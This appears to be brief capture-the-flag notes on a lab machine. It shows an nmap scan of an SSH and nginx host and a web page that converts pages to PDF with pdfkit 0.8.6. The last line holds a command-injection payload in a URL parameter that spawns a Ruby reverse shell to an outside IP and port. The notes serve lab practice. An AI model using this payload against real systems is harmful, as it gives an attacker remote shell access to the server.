# Nmap
```
# Nmap 7.92 scan initiated Wed Feb  1 18:53:36 2023 as: nmap -sC -sV -oN nmap/init 10.10.11.189
Nmap scan report for 10.10.11.189
Host is up (0.60s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE    SERVICE            VERSION
22/tcp   open     ssh                OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 84:5e:13:a8:e3:1e:20:66:1d:23:55:50:f6:30:47:d2 (RSA)
|   256 a2:ef:7b:96:65:ce:41:61:c4:67:ee:4e:96:c7:c8:92 (ECDSA)
|_  256 33:05:3d:cd:7a:b7:98:45:82:39:e7:ae:3c:91:a6:58 (ED25519)
80/tcp   open     http               nginx 1.18.0
|_http-title: Did not follow redirect to http://precious.htb/
|_http-server-header: nginx/1.18.0
6881/tcp filtered bittorrent-tracker
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Feb  1 18:55:15 2023 -- 1 IP address (1 host up) scanned in 99.05 seconds
```

# Webpage
plain webpage
convert web page to pdf

pdf made with pdfkit v0.8.6/?name=%20` ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.16.39",9001))')
